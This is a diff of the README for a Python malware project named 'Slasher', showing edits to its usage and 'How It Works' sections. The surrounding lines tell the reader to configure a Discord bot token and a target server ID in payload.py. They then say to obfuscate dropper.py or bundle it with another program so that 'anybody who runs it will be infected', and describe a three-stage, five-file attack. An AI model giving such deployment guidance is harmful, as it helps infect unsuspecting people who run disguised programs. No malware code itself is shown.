@@ -35,8 +35,6 @@ Im tired of python malware being lame.
   
 # Usage
 
-*if you dont know anything about python, it may be difficult to get slasher running*
-
 1. Set the "TOKEN" variable at the top of payload.py to you your discord bot token.
 
 2. In payload.py, find the variable "id" on line 102 and replace "discord_server_id" with the ID of the server you want the bot to message in.
@@ -50,7 +48,7 @@ Im tired of python malware being lame.
 6. Obfuscate dropper.py or bundle it with another program! Anybody who runs it will be infected!
 
 # How It Works
-Slasher is a three-stage attack comprised of 5 files. Below is a description of each file's functionality in order of execution.
+Slasher is a three-stage attack made up of of 5 files. Below is a description of each file's function in order of executions
 
 
 ## *dropper.py*
